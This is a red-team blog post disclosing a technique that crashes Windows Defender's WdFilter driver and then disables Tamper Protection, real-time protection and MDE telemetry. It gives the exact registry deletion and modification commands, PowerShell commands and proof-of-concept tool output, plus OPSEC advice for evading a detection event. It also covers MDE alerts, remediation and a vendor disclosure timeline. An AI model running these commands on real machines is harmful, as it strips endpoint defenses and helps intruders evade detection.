---
title: Breaking through Defender's Gates - Disabling Tamper Protection and other Defender components
date: 2024-06-06 09:48:47 +07:00
categories: RedTeaming
modified: 2024-06-06 09:49:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: Crashing WdFilter to disable Tamper Protection and other Defender / MDE components
#thumbnail: "https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Paces_Review/lab.png"
#image: "https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Paces_Review/lab.png"
---

**Also published on: <https://www.alteredsecurity.com/post/disabling-tamper-protection-and-other-defender-mde-components>**

## Summary

With the introduction of Tamper Protection, it has now become harder to disable Defender settings as an adversary. This is due to the fact that Tamper Protection and other Defender registry settings are protected by a Kernel-mode driver called WdFilter.sys.

During my research I found it possible to abuse SYSTEM / TrustedInstaller privileges to tamper WdFilter settings and unload the kernel minidriver to disable Tamper protection and other Defender components. This also affects Microsoft's Defender for Endpoint (MDE), blinding MDE of telemetry and activity performed on a target.  

I have created a POC called Disable-TamperProtection showcasing this bypass to disable WdFilter, Tamper Protection, Real-time protection (AMSI) and reinstate them back. A sample test against a target Server 2022 MDE testlab instance  can be found below.

The POC can be found on GitHub here: https://github.com/AlteredSecurity/Disable-TamperProtection

*NOTE: Administrative privileges are required to run the POC and technique.*

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020240311143923.png)


## Description

Tamper Protection in Windows Security **helps prevent malicious apps from changing important Microsoft Defender Antivirus settings**, including real-time protection and cloud-delivered protection. With the introduction of Tamper Protection, it is not possible to disable Defender settings using commands such as `Set-MpPreference -DisableRealtimeMonitoring $true`.

To disable Tamper Protection via registry, the registry subkey - `TamperProtection` located at `HKLM\SYSTEM\CurrentControlSet\Services\WinDefend` should be set from `5` to `0/4`.  
It is not possible to modify registry subkey values at `HKLM\SYSTEM\CurrentControlSet\Services\WinDefend` even using SYSTEM / TrustedInstaller privileges because "**Windows Defender has a kernel-mode driver (WdFilter.sys) that registers a Registry callback filter which protects Defender’s registry keys**." 

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124161502.png)

In short, the Defender protection chain is as follows: 
*WdFilter (prevents Tamper protection and other defender registry key alteration) → Tamper Protection (prevents Defender settings alteration) → Defender settings and registry keys enable AV / MDE on the target (Real-time protection / IOAVProtection etc.)*

To disable Defender / MDE settings, it is required to disable these prior protections (WdFilter + Tamper Protection regkey) safeguarding it.

In theory, if it is possible to unload, crash / stop the WdFilter kernel minidriver from running, the Defender service can be stopped from using the WdFilter kernel minidriver from processing events and intern protecting Tamper Protection and other Defender's Registry Keys, after which it should be possible to disable Tamper Protection and other settings such as Real-Time Protection.

### Disabling Wdfilter by removing Altitude Numbers

"A minifilter driver's `FilterUnloadCallback` routine is called when the minifilter driver is unloaded. This routine closes any open communication server ports, calls `FltUnregisterFilter`, and performs any needed cleanup. Registering this routine is optional. However, if the minifilter driver does not register a `FilterUnloadCallback` routine, the minifilter driver cannot be unloaded."

Analyzing with Windbg, WdFilter's FilterUnloadCallback routine can be found at WdFilter+0x72db0 suggesting that the driver can be unloaded.

```
0: kd> !fltkd.filter ffffe584ec85c010
FLT_FILTER: ffffe584ec85c010 "WdFilter" "328010"
   FLT_OBJECT: ffffe584ec85c010  [02000000] Filter
      RundownRef               : 0x0000000000003730 (7064)
      PointerCount             : 0x0000000b 
      PrimaryLink              : [ffffe584ef4eba30-ffffe584ef6ea020] 
   Frame                    : ffffe584ec4c57d0 "Frame 0" 
   Flags                    : [00000032] FilteringInitiated BackedByPagefile SupportsDaxVolume
   DriverObject             : ffffe584ec8575c0 
   FilterLink               : [ffffe584ef4eba30-ffffe584ef6ea020] 
   PreVolumeMount           : 0000000000000000  (null) 
   PostVolumeMount          : fffff806638e50e0  WdFilter+0x50e0 
   FilterUnload             : fffff80663952db0  WdFilter+0x72db0 
   InstanceSetup            : fffff806639294b0  WdFilter+0x494b0
   [snip]
```

Trying to unload the WdFilter kernel minidriver using elevated privileges such as SYSTEM / TrustedInstaller in a command prompt using fltmc we receive the following output:

```
C:\> fltmc
Filter Name                     Num Instances    Altitude    Frame
------------------------------  -------------  ------------  -----
bindflt                                 0       409800         0
WdFilter                                4       328010         0
storqosflt                              0       244000         0
wcifs                                   0       189900         0
CldFlt                                  0       180451         0
FileCrypt                               0       141100         0
luafv                                   1       135000         0
npsvctrig                               1        46000         0
Wof                                     1        40700         0

C:\> fltmc unload WdFilter
Unload failed with error: 0x801f0010
Do not detach the filter from the volume at this time.
```

Analyzing the unloading process we find the following results.

- The attempted driver unload operation for WdFilter failed due to conditions within the driver's unload routine (`WdFilter+0x72db0`) not being met / permission dependencies preventing a safe unload.
- The code at `WdFilter+0x72db0` includes a conditional jump (`jne`) based on the result of a test instruction. A similar conditional jump exists in `FLTMGR!FltpDoUnloadFilter` based on prior values passed in from the `WdFilter+0x72db0` routine.
- The call stack at `FLTMGR!FltpDoUnloadFilter+0x19d`, indicates the initiation of the unload process by Filter Manager (`FLTMGR`).
The debugger output indicates a crash during the execution of `FLTMGR!FltpDoUnloadFilter+0x19d` and `nt!KeQueryPerformanceCounter`.

```
kd> u WdFilter+0x72db0
WdFilter+0x72db0:
fffff806`63952db0  fa              cli
fffff806`63952db1  83e280          and     edx,80000000h
fffff806`63952db4  49f7c2          test    r10,rdx
fffff806`63952db7  7513            jne     WdFilter+0x72dcc (fffff806`63952dcc)
fffff806`63952db9  488b4c2428      mov     rcx,qword ptr [rsp+28h]
fffff806`63952dbe  4c8b642420      mov     r12,qword ptr [rsp+20h]
[snip]

kd> u FLTMGR!FltpDoUnloadFilter+0x19d
FLTMGR!FltpDoUnloadFilter+0x19d:
fffff802`558c5939 90              nop
fffff802`558c593a 448bf0          mov     r14d,eax
fffff802`558c593d 85c0            test    eax,eax
fffff802`558c593f 7909            jns     FLTMGR!FltpDoUnloadFilter+0x1ae (fffff802`558c594a)
[snip]

kd> kv
 # Child-SP          RetAddr           : Call Site
00 fffff50b`de63e8d0 fffff801`64e657fe : nt!KeQueryPerformanceCounter+0x8d
01 fffff50b`de63e900 fffff801`64e65bfe : FLTMGR!FltpDoUnloadFilter+0x19d
02 fffff50b`de63eaf0 fffff801`64e69371 : FLTMGR!FltpUnloadFilterWorker+0xe
03 fffff50b`de63eb20 fffff801`670c46b5 : FLTMGR!FltpSyncOpWorker+0x51
04 fffff50b`de63eb70 fffff801`671078e5 : nt!ExpWorkerThread+0x105
05 fffff50b`de63ec10 fffff801`672064b8 : nt!PspSystemThreadStartup+0x55
06 fffff50b`de63ec60 00000000`00000000 : nt!KiStartSystemThread+0x28
```

Since WdFilter's `FilterUnloadCallback` routine exists, it is possible to consider another approach to unload the minidriver.

"The altitude is an infinite-precision string interpreted as a decimal number. A filter driver that has a low numerical altitude is loaded into the I/O stack below a filter driver that has a higher numerical value. Microsoft allocates "integer" altitude values based on filter requirements and load order group."

Trying to abuse the principle of load order groups with SYSTEM / TrustedInstaller privileges to unload the WdFilter minidriver by altering the altitude to match an already existing minidriver's altitude does not succeed. (WdFilter takes higher precedence and crashes the other minidriver instead.) 
However, one method that did succeed is to use these privileges to crash the WdFilter minidriver on reboot by deleting or renaming the "Altitude number" registry key.

The attack chain can be summarized as follows:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/edited.png)

#### 1. Crash and Stop WDFilter

From above, it is noted that the WdFilter kernel minidriver has an altitude number of: `328010`

Querying registry in a PowerShell administrator session (`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter`), it is found that SYSTEM is the OWNER of this regkey and has FULL CONTROL privileges.

```
PS C:\Users\Administrator> 
$registryKeyPath = "HKLM:\SYSTEM\CurrentControlSet\Services\WdFilter"
$acl = Get-Acl -Path $registryKeyPath
$acl

Path                                                                                              Owner
Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter NT AUTHORITY\SYSTEM 
```

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124163404.png)

It is possible to impersonate such privileges to run a Command Prompt with SYSTEM / TrustedInstaller contexts, enabling all privileges and Integrity Levels. Some notable tools that can do this are [NSudo](https://github.com/M2Team/NSudo/releases),  [superUser](https://github.com/mspaintmsi/superUser) and [PSExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec).

In this case, Nsudo has been used to create a cmd.exe process as SYSTEM (S) / TrustedInstaller (T), enabling all privileges (E): 

```
# Run as SYSTEM context
C:\Users\Administrator> "C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64\NSudoLC.exe" -U:S -P:E cmd

OR

# Run as TrustedInstaller context
C:\Users\Administrator> "C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64\NSudoLC.exe" -U:S -P:E cmd

# New command prompt with elevated privileges
C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeCreateTokenPrivilege                    Create a token object                                              Enabled
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
[snip]
```

Upon attempting to execute the reg.exe command to delete the "Altitude number" regkey associated with the WdFilter driver, it was confirmed that the operation was successful.

```
C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64> reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance" /v Altitude /f
The operation completed successfully.
````

Next, reboot the computer (recommended) or wait a few minutes (inconsistent: ~20 mins) for the changes to take effect.

```
C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64> shutdown /r /t 0
```

It is noted that the WdFilter kernel minidriver fails to load on the next reboot because the Altitude registry subkey has been deleted breaking its functionality.

```
C:\Users\Administrator> fltmc

Filter Name                     Num Instances    Altitude    Frame
------------------------------  -------------  ------------  -----
bindflt                                 0       409800         0
storqosflt                              0       244000         0
wcifs                                   0       189900         0
CldFlt                                  0       180451         0
FileCrypt                               0       141100         0
luafv                                   1       135000         0
npsvctrig                               1        46000         0
Wof                                     1        40700         0
```

#### 2. Disable Tamper Protection

Now that the WdFilter kernel minidriver is no longer loaded and protecting the Defender Registry Keys, successfully proceed to disable these unprotected keys, in this case the Tamper Protection regkey as it is the next protection chain in line to finally in turn disable defender protections like Real-time protection.

Continue disabling Tamper Protection using reg.exe in the newly spawned NSudo elevated prompt as before by setting the `TamperProtection` subkey to `4/0`:

```
# Command prompt with elevated privileges
C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64> reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 4 /f
The operation completed successfully.
```

#### 3. Disable Defender Settings

Finally, since Tamper Protection is now disabled leaving Defender / MDE settings vulnerable to change, disable AV and AMSI in a standard PowerShell Administrator prompt (SYSTEM / TrustedInstaller privileges are not mandatory) using the following commands:

```
# Disable Real-time protection altogether
PS C:\Users\Administrator> Set-MpPreference -DisableRealtimeMonitoring $true

# Only disables scanning for downloaded files or attachments
PS C:\Users\Administrator> Set-MpPreference -DisableIOAVProtection $true
```

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124183431.png)

*NOTE: Even though Tamper Protection is effectively disabled now, it takes a a reboot to render the same change in the "Security Settings" GUI Prompt.*

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124183731.png)


## Proof of Concept

A POC has been included, called Disable-TamperProtection which can be found on GitHub here: <https://github.com/AlteredSecurity/Disable-TamperProtection>

*NOTE: VC_redist.x64.exe (MSVC runtime) could be required on the target.*

Required elevated privileges to perform the attack have been incorporated in the POC by using the superUser project codebase as a reference for TrustedInstaller privilege impersonation. 

POC Video Demo: https://www.youtube.com/watch?v=aGTrjDxMSdU

The POC works in 3 steps (Admin privileges required):

```
C:\Users\User\Desktop> .\Disable-TamperProtection.exe
Sequential Usage: 1 --> 2 --> 3
1:      Unload WdFilter
2:      Disable Tamper Protection
3:      Disable AV/MDE
4:      Restore AV/MDE settings
```

An example, to use the POC is as follows:

1) Unload WdFilter:

```
C:\Users\User\Desktop> .\Disable-TamperProtection.exe 1
[+] WdFilter Altitude Registry key Value: 328010
[+] Trusted Installer handle: 0000000000000120
[!] Spawning registry with TrustedInstaller privileges to delete WdFilter "Altitude" regkey.
[+] Created process ID: 3744 and assigned additional token privileges.
[+] Execute option 1 to validate!

# Upon 2nd exec if the above output repeats the target isn't vulnerable
C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
[+] WdFilter Altitude Registry key has been successfully deleted.
[+] Enumerating WdFilter information:
        Next:   0 | Frame ID:   0 | No. of Instances:   4 | Name:        wdfilter | Altitude:          328010
[+] Restart the system or wait a few minutes for WdFilter to unload.
[+] Execute option 1 to validate!

# Restart to crash and unload WdFilter
C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
[+] WdFilter Altitude Registry key has been successfully deleted.
[+] WDFilter has been successfully unloaded, use option 2 to disable Tamper Protection.
```

2) Disable Tamper Protection:

```
C:\Users\User\Desktop>.\Disable-TamperProtection.exe 2
[+] WdFilter Altitude Registry key has been successfully deleted.
[+] Trusted Installer handle: 00000000000000C4
[!] Spawning registry with TrustedInstaller privileges to alter Defender "TamperProtection" regkey from 5 to 4.
[+] Created process ID: 7748 and assigned additional token privileges.
[+] Use option '3' to finally Disable AV/MDE.
```

3) Disable Defender / MDE components:

```
C:\Users\User\Desktop>.\Disable-TamperProtection.exe 3
[+] WdFilter Altitude Registry key has been successfully deleted.
[+] Trusted Installer handle: 000000000000011C
[!] Spawning registry with TrustedInstaller privileges to Disable 'RealtimeMonitoring' regkey.
[+] To disable other components of defender check source.
[+] Created process ID: 8040 and assigned additional token privileges.
```

*NOTE: Even though Tamper Protection is effectively disabled now, it takes a reboot to render the same change in the "Security Settings" GUI Prompt.*

The POC manages to semi-permanently disable Real-time protection (grey out) after Tamper Protection is disabled. This can be remediated using option 4.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020240311143923.png)

4) Optionally reinstate the WdFilter minidriver, TamperProtection and Defender Settings (Real-time protection) utilizing option 4. Make sure to change the Altitude number (Default: 328010) back to it's original value at line 530 in the POC.  

```
# Restart the computer to restore settings successfully
C:\Users\User\Desktop>.\Disable-TamperProtection.exe 4
[+] WdFilter Altitude Registry key has been successfully deleted.
[+] Make sure to change Altitude in Source (Default: 328010) and reboot computer after execution.
[+] Trusted Installer handle: 0000000000000120
[!] Spawning registry with TrustedInstaller privileges to Enable 'RealtimeMonitoring' regkey.
[+] Created process ID: 5852 and assigned additional token privileges.
[!] Spawning registry with TrustedInstaller privileges to Enable 'TamperProtection' regkey.
[+] Created process ID: 2744 and assigned additional token privileges.
[!] Spawning registry with TrustedInstaller privileges to restore WdFilter "Altitude" regkey.
[+] Created process ID: 7044 and assigned additional token privileges.
```

The CodeBase in the Disable-TamperProtection POC can be altered to disable specific or all components of Defender / MDE. These have been included as comments in the POC at line 338. 

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020231227155027.png)

An example to chain / add parts to disable more than one component together is yet again showcased in comments at line 382.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020231227155153.png)

## Impact against MDE

Testing the POC against a target Windows machine as mentioned with MDE enabled, it is found that Tamper Protection can successfully be disabled along with other Defender settings.

## Detection and Alerts

Alerts and detections can be used to build basic telemetry and detections for this attack.
Testing the POC with MDE enabled results in successful execution with the following alerts raised.

**Alert 1:** Suspicious process reparenting detected: This alert is generated when a process is spawned under TrustedInstaller to gain its privileges.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020231211123832.png)

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020231211123417.png)

**Alert 2:** Tampering with Microsoft Defender for Endpoint sensor settings: This alert is generated upon deletion of the WdFilter Altitude regkey.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020231211123519.png)


## Resolution, Telemetry and related OPSEC

Apart from logs generated by the attack using NSudo / the POC and privileged access, An `Information Event` is generated on every reboot with an `EVENT ID: 7026`, stating that the "WdFilter driver failed to load".

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124184543.png)

This could be used as a good IoC if the WdFilter driver fails to load each time on a reboot. 

To evade the above event and improve the OPSEC for this attack, add the original deleted Altitude number back using SYSTEM / TrustedInstaller privileges (using NSudo / superUser) as before to restore the WdFilter minidriver using reg.exe.

Tamper Protection would still be disabled, allowing the ability to modify / disable RealTimeMonitoring and other settings while avoiding the above log event from a future reboot.

```
# Command prompt with elevated privileges
C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64> reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance" /v Altitude /t REG_SZ /d 328010 /f
The operation completed successfully.
```

Reboot the computer to make the changes effective. The WdFilter minidriver is restored back to it's original state, leaving Tamper Protection and Real-Time Protection still disabled. This improves the overall OPSEC avoiding the above-mentioned Event ID.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124190217.png)

To restore Tamper Protection back to its original "enabled" state, perform the same process as above with an elevated NSudo prompt, setting the `TamperProtection` subkey value back to `5`: 

```
# Command prompt with elevated privileges
C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64> reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 5 /f
The operation completed successfully.
```

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124190959.png)

After performing a reboot, Tamper Protection re-enables along with Real-Time Protection and restores it back to its original protected state. Real-Time Protection can optionally be manually re-enabled in an Admin PowerShell session using:

```
# Enable Real-time protection altogether
PS C:\Users\Administrator> Set-MpPreference -DisableRealtimeMonitoring $false

# Enables scanning for downloaded files or attachments
PS C:\Users\Administrator> Set-MpPreference -DisableIOAVProtection $false
```

The Proof of Concept (POC) incorporates functionality to reinstate the WdFilter minidriver, Tamper Protection and Defender settings (Real-Time protection) based on this concept using option 4.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124191854.png)

## Remediation

To remediate this vulnerability, avoid permitting TrustedInstaller / SYSTEM privileges to alter and delete sensitive Defender registry keys such as the `HKLM\SYSTEM\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance\Altitude` registry key as patched in latest Windows versions (April 2024).

## Platform

This vulnerability, in my testing affects the following versions of Windows:
- Windows Server 2022 until BuildLabEx Version: 20348.1.amd64fre.fe_release.210507-1500 (April 2024 update)
- Windows 10 until BuildLabEx Version: 19041.1.amd64fre.vb_release.191206-1406 (April 2024 update)
- Windows 11 until BuildLabEx Version: 22621.1.amd64fre.ni_release.220506-1250 (Sep 2023 update). 

## Disclosure Timeline

- Sep 23, 2022 - Initial discovery.
- Jan 05, 2024 - Reported with POC through MSRC portal.
- Jan 11, 2024 - MSRC team confirmed. MSRC ticket was moved to Review / Repro.
- Mar 07, 2024 - MSRC status was changed to Complete stating "unable to reproduce this issue."
- April 09, 2024 - Patched on most Windows versions as part of security updates.
- June 06, 2024 - Public release of Blog and POC.

## References

- [Load order groups and altitudes for minifilter drivers by Microsoft](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/load-order-groups-and-altitudes-for-minifilter-drivers)
- [NSudo](https://github.com/M2Team/NSudo/releases)
- [superUser](https://github.com/mspaintmsi/superUser)
- [Research paper on Blinding Defender](https://arxiv.org/ftp/arxiv/papers/2210/2210.02821.pdf)

